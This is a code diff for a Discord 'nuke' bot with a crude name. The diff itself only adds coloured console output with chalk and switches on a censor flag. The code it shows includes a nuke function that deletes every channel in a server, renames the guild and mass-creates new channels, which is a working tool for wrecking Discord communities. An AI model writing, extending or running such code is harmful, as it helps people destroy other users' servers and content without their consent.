@@ -1,8 +1,10 @@
+const chalk = require('chalk');
+
 console.log('Your Cum Wont Last v1.0');
 console.log('loading...');
 
 // MODIFY THIS BEFORE RUNNING
-const censor = false // censor trigger
+const censor = true // censor trigger
 const whitelist = false //channel whitelist (not done yet)
 const server = true // change name of the server
 const gomsg = "Let's funk !"
@@ -60,14 +62,14 @@ client.on("messageCreate", (message) => {
 async function nuke(msg) {
     msg.guild.channels.cache.forEach(async (channel, id) => {
         channel.delete()
-  .then(console.log(`deleted ${channel.name}`))
+  .then(console.log(chalk.red(`deleted ${channel.name}`)))
   .catch(console.error);
     });
 
     if(server == true) {
         if(!msg.guild.me.permissions.has(Permissions.FLAGS.MANAGE_GUILD)) return console.log("Cannot change guild name")
         msg.guild.setName('Your Cum Wont Last (discord)')
-        .then(updated => console.log(`Updated guild name to ${updated.name}`))
+        .then(updated => console.log(chalk.green(`Updated guild name to ${updated.name}`)))
         .catch(console.error);
     }
 
@@ -87,7 +89,7 @@ async function nuke(msg) {
                     allow: ["VIEW_CHANNEL"],
                 }]
             })  //.send(`https://www.youtube.com/watch?v=7Do70nztRNE | ${rng}`)
-            console.log(`create channel ${line}`);
+            console.log(chalk.green(`create channel ${line}`));
         });
     } catch (err) {
         console.error(err);
